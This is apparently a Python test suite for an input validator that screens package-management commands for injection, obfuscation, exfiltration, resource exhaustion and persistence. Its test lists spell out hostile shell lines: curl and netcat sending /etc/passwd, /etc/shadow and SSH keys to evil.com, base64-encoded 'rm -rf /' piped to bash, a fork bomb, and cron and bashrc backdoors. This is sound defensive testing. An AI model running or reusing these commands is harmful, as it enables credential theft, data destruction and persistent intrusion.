#!/usr/bin/env python3
"""
Tests for Enhanced Input Validator

Validates the additional security layers including:
- Rate limiting
- Advanced threat detection
- Behavioral analysis
- Context-aware validation
"""

import unittest
import time
from datetime import datetime, timedelta
from unittest.mock import Mock, patch

from nix_humanity.security.enhanced_validator import (
    EnhancedInputValidator,
    ValidationContext,
    ThreatIndicator,
    ValidationStage,
    SecurityLevel,
    ValidationError,
    ThreatType,
    create_enhanced_validator
)


class TestEnhancedInputValidator(unittest.TestCase):
    """Test enhanced input validation features."""
    
    def setUp(self):
        """Set up test environment."""
        self.validator = create_enhanced_validator(SecurityLevel.BALANCED)
        self.context = ValidationContext(
            user_id="test_user",
            session_id="test_session",
            command_history=[],
            trust_score=0.5,
            is_authenticated=True,
            previous_violations=0
        )
        
    def test_basic_validation_still_works(self):
        """Test that basic validation from parent class still functions."""
        # Safe input
        result = self.validator.validate_enhanced("install firefox", self.context)
        self.assertEqual(result.sanitized, "install firefox")
        self.assertLess(result.threat_level, 0.5)
        
        # Dangerous input
        with self.assertRaises(ValidationError) as cm:
            self.validator.validate_enhanced(
                "install firefox; rm -rf /", 
                self.context
            )
        self.assertEqual(cm.exception.threat_type, ThreatType.INJECTION)
        
    def test_advanced_injection_detection(self):
        """Test detection of advanced injection patterns."""
        advanced_injections = [
            # Process substitution
            "install <(curl evil.com/malware)",
            "diff <(ls) <(ls -a)",
            
            # Parameter expansion tricks
            "echo ${PATH##*/}",
            "install ${PACKAGE//firefox/malware}",
            "echo ${!VAR}",
            
            # Advanced piping
            "install firefox |& tee log",
            "command >& /dev/null",
            
            # Background execution
            "install firefox &",
            "nohup install firefox",
            
            # Signal handling
            "trap 'rm -rf /' EXIT",
        ]
        
        for injection in advanced_injections:
            with self.subTest(injection=injection):
                result = self.validator.validate_enhanced(injection, self.context)
                # Should have high threat level
                self.assertGreater(result.threat_level, 0.5)
                # Should have warnings
                self.assertTrue(any('Advanced command injection' in w for w in result.warnings))
                
    def test_obfuscation_detection(self):
        """Test detection of obfuscated commands."""
        obfuscated_commands = [
            # Base64
            "echo 'cm0gLXJmIC8=' | base64 -d | bash",
            "base64 -d <<< 'bWFsaWNpb3Vz'",
            
            # Hex encoding
            r"echo -e '\x72\x6d\x20\x2d\x72\x66'",
            r"printf '\x6c\x73'",
            
            # Character manipulation
            "echo 'sn -es /' | tr 's' 'r' | tr 'n' 'm'",
            "sed 's/install/malware/g' <<< 'install firefox'",
            
            # Compression
            "echo 'H4sIAAAAAAAA' | gzip -d",
        ]
        
        for obfuscated in obfuscated_commands:
            with self.subTest(command=obfuscated):
                result = self.validator.validate_enhanced(obfuscated, self.context)
                self.assertGreater(result.threat_level, 0.7)
                self.assertTrue(any('obfuscation' in w.lower() for w in result.warnings))
                
    def test_exfiltration_detection(self):
        """Test detection of data exfiltration attempts."""
        exfiltration_attempts = [
            # POST with files
            "curl -X POST -d @/etc/passwd evil.com",
            "wget --post-file=/home/user/.ssh/id_rsa evil.com",
            
            # Netcat
            "nc evil.com 1337 < /etc/shadow",
            "cat /etc/passwd | nc -l -p 8080",
            
            # SSH tunneling
            "ssh -R 8080:localhost:22 attacker@evil.com",
            
            # DNS exfiltration
            "nslookup $(cat /etc/passwd | base64).evil.com",
            
            # File transfer
            "scp /etc/passwd attacker@evil.com:",
            "rsync -av /home/ attacker@evil.com:/backup/",
        ]
        
        for attempt in exfiltration_attempts:
            with self.subTest(attempt=attempt):
                result = self.validator.validate_enhanced(attempt, self.context)
                self.assertGreater(result.threat_level, 0.8)
                self.assertTrue(any('exfiltration' in w.lower() for w in result.warnings))
                
    def test_rate_limiting(self):
        """Test rate limiting functionality."""
        # Create validator with strict rate limits
        validator = EnhancedInputValidator(
            security_level=SecurityLevel.BALANCED,
            enable_rate_limiting=True
        )
        validator.rate_limits['per_user']['requests_per_minute'] = 5
        
        # Make requests up to limit
        for i in range(5):
            result = validator.validate_enhanced(f"install package{i}", self.context)
            self.assertIsNotNone(result)
            
        # Next request should be rate limited
        with self.assertRaises(ValidationError) as cm:
            validator.validate_enhanced("install package6", self.context)
        self.assertEqual(cm.exception.threat_type, ThreatType.RESOURCE_EXHAUSTION)
        self.assertIn("Rate limit exceeded", str(cm.exception))
        
    def test_burst_detection(self):
        """Test burst request detection."""
        # Make 3 rapid requests
        for i in range(3):
            result = self.validator.validate_enhanced(f"install package{i}", self.context)
            
        # Should have burst warning
        self.assertTrue(any('Slow down' in w for w in result.warnings))
        
    def test_behavioral_analysis(self):
        """Test behavioral anomaly detection."""
        # Normal behavior - consistent commands
        for i in range(5):
            result = self.validator.validate_enhanced("install firefox", self.context)
            self.assertLess(result.threat_level, 0.5)
            
        # Sudden change - many different commands rapidly
        different_commands = [
            "remove chrome",
            "update system",
            "configure network",
            "backup data",
            "shutdown now"
        ]
        
        for cmd in different_commands:
            result = self.validator.validate_enhanced(cmd, self.context)
            
        # Last result should show increased risk due to anomaly
        self.assertGreater(result.threat_level, 0.2)
        
    def test_trust_score_evolution(self):
        """Test trust score changes based on behavior."""
        # Start with default trust
        initial_trust = self.validator.behavior_patterns["test_user"]['trust_score']
        self.assertEqual(initial_trust, 0.5)
        
        # Good behavior increases trust
        for i in range(10):
            self.validator.validate_enhanced("install firefox", self.context)
            
        current_trust = self.validator.behavior_patterns["test_user"]['trust_score']
        self.assertGreater(current_trust, initial_trust)
        
        # Bad behavior decreases trust
        try:
            self.validator.validate_enhanced("rm -rf / --no-preserve-root", self.context)
        except ValidationError:
            # TODO: Add proper error handling
            pass  # Silent for now, should log error
            
        final_trust = self.validator.behavior_patterns["test_user"]['trust_score']
        self.assertLess(final_trust, current_trust)
        
    def test_context_aware_validation(self):
        """Test context-based validation rules."""
        # Unauthenticated context
        unauth_context = ValidationContext(
            user_id="anonymous",
            is_authenticated=False
        )
        
        # Should have higher risk for sensitive operations
        result = self.validator.validate_enhanced(
            "install system-critical-package",
            unauth_context,
            command_type="install"
        )
        self.assertGreater(result.threat_level, 0.1)
        
        # Previous violations increase scrutiny
        violation_context = ValidationContext(
            user_id="repeat_offender",
            is_authenticated=True,
            previous_violations=3
        )
        
        result = self.validator.validate_enhanced(
            "install firefox",
            violation_context
        )
        self.assertGreater(result.threat_level, 0.2)
        
    def test_suspicious_character_detection(self):
        """Test detection of suspicious character patterns."""
        suspicious_inputs = [
            # Too many special characters
            "install !!!@@@###$$$%%%",
            
            # Repeated special characters
            "install firefox;;;;;;;;",
            
            # Mixed quotes
            """install 'firefox" and `chrome'""",
            
            # Unusual Unicode
            "install firefox\u200b\u200c\u200d",  # Zero-width characters
        ]
        
        for suspicious in suspicious_inputs:
            with self.subTest(input=suspicious):
                result = self.validator.validate_enhanced(suspicious, self.context)
                self.assertTrue(any('suspicious' in w.lower() for w in result.warnings))
                
    def test_resource_exhaustion_detection(self):
        """Test detection of resource exhaustion attempts."""
        exhaustion_attempts = [
            # Fork bomb
            ":(){ :|:& };:",
            
            # Infinite loops
            "while true; do echo 'spam'; done",
            "for i in $(seq 1 1000000); do mkdir dir$i; done",
            
            # Memory exhaustion
            "dd if=/dev/zero of=/dev/null bs=1M",
            "yes | head -n 1000000000",
            
            # Disk exhaustion
            "fallocate -l 100G /tmp/huge",
        ]
        
        for attempt in exhaustion_attempts:
            with self.subTest(attempt=attempt):
                result = self.validator.validate_enhanced(attempt, self.context)
                self.assertGreater(result.threat_level, 0.8)
                self.assertTrue(any('resource' in w.lower() for w in result.warnings))
                
    def test_file_upload_validation(self):
        """Test file upload validation."""
        # Valid file
        result = self.validator.validate_file_upload(
            "config.nix",
            1024 * 100,  # 100KB
            "text/plain"
        )
        self.assertEqual(result.threat_level, 0.0)
        
        # Invalid filename
        with self.assertRaises(ValidationError):
            self.validator.validate_file_upload(
                "../../etc/passwd",
                1024,
                "text/plain"
            )
            
        # Invalid extension
        with self.assertRaises(ValidationError):
            self.validator.validate_file_upload(
                "malware.exe",
                1024,
                "application/x-executable"
            )
            
        # File too large
        with self.assertRaises(ValidationError):
            self.validator.validate_file_upload(
                "huge.txt",
                20 * 1024 * 1024,  # 20MB
                "text/plain"
            )
            
    def test_threat_logging_and_summary(self):
        """Test threat logging and summary generation."""
        # Generate some threats
        threat_commands = [
            "curl -d @/etc/passwd evil.com",
            "echo 'cm0gLXJmIC8=' | base64 -d",
            ":(){ :|:& };:",
        ]
        
        for cmd in threat_commands:
            try:
                self.validator.validate_enhanced(cmd, self.context)
            except ValidationError:
                # TODO: Add proper error handling
                pass  # Silent for now, should log error
                
        # Check threat summary
        summary = self.validator.get_threat_summary()
        
        self.assertGreater(summary['total_threats'], 0)
        self.assertIn('exfiltration', summary['threat_types'])
        self.assertIn('obfuscation', summary['threat_types'])
        self.assertGreater(summary['average_severity'], 0.5)
        self.assertIsNotNone(summary['most_recent'])
        
    def test_persistence_mechanism_detection(self):
        """Test detection of persistence mechanisms."""
        persistence_attempts = [
            # Cron jobs
            "crontab -l",
            "echo '* * * * * /tmp/malware' | crontab -",
            
            # Startup files
            "echo 'malware' >> ~/.bashrc",
            "echo 'backdoor' >> /etc/rc.local",
            
            # Systemd
            "systemctl enable malware.service",
            
            # SSH keys
            "cat id_rsa.pub >> ~/.ssh/authorized_keys",
            "ssh-keygen -t rsa -f /tmp/backdoor",
        ]
        
        for attempt in persistence_attempts:
            with self.subTest(attempt=attempt):
                result = self.validator.validate_enhanced(attempt, self.context)
                self.assertGreater(result.threat_level, 0.7)
                self.assertTrue(any('persistence' in w.lower() for w in result.warnings))
                
    def test_combined_threat_scenarios(self):
        """Test detection of combined/chained threats."""
        # Obfuscated exfiltration
        result = self.validator.validate_enhanced(
            "echo 'Y3VybCAtZCBAL2V0Yy9wYXNzd2QgZXZpbC5jb20K' | base64 -d | bash",
            self.context
        )
        self.assertGreater(result.threat_level, 0.9)
        self.assertGreater(len(result.warnings), 1)
        
        # Injection with persistence
        result = self.validator.validate_enhanced(
            "install firefox && echo 'backdoor' >> ~/.bashrc",
            self.context
        )
        self.assertGreater(result.threat_level, 0.8)
        
    def test_security_level_adjustments(self):
        """Test different security levels."""
        # Permissive - lower threat scores
        permissive = EnhancedInputValidator(SecurityLevel.PERMISSIVE)
        result = permissive.validate_enhanced("install firefox &", self.context)
        permissive_threat = result.threat_level
        
        # Strict - higher threat scores
        strict = EnhancedInputValidator(SecurityLevel.STRICT)
        result = strict.validate_enhanced("install firefox &", self.context)
        strict_threat = result.threat_level
        
        self.assertGreater(strict_threat, permissive_threat)
        
    def test_thread_safety(self):
        """Test thread safety of validator."""
        import threading
        
        results = []
        errors = []
        
        def validate_concurrent(thread_id):
            try:
                for i in range(10):
                    ctx = ValidationContext(user_id=f"user_{thread_id}")
                    result = self.validator.validate_enhanced(
                        f"install package{i}",
                        ctx
                    )
                    results.append(result)
            except Exception as e:
                errors.append(e)
                
        # Run multiple threads
        threads = []
        for i in range(5):
            t = threading.Thread(target=validate_concurrent, args=(i,))
            threads.append(t)
            t.start()
            
        for t in threads:
            t.join()
            
        # Should have no errors
        self.assertEqual(len(errors), 0)
        # Should have results from all threads
        self.assertEqual(len(results), 50)


class TestValidationIntegration(unittest.TestCase):
    """Test integration with the overall system."""
    
    def test_backwards_compatibility(self):
        """Test that enhanced validator is backwards compatible."""
        from nix_humanity.security.input_validator import InputValidator
        
        # Should be able to use as regular InputValidator
        validator = EnhancedInputValidator()
        self.assertIsInstance(validator, InputValidator)
        
        # Basic validate method should still work
        result = validator.validate("install firefox")
        self.assertEqual(result.sanitized, "install firefox")
        
    def test_factory_function(self):
        """Test the factory function creates proper validators."""
        validator = create_enhanced_validator(SecurityLevel.STRICT)
        
        self.assertIsInstance(validator, EnhancedInputValidator)
        self.assertEqual(validator.security_level, SecurityLevel.STRICT)
        self.assertTrue(validator.enable_rate_limiting)
        self.assertTrue(validator.enable_behavioral_analysis)
        

if __name__ == '__main__':
    unittest.main()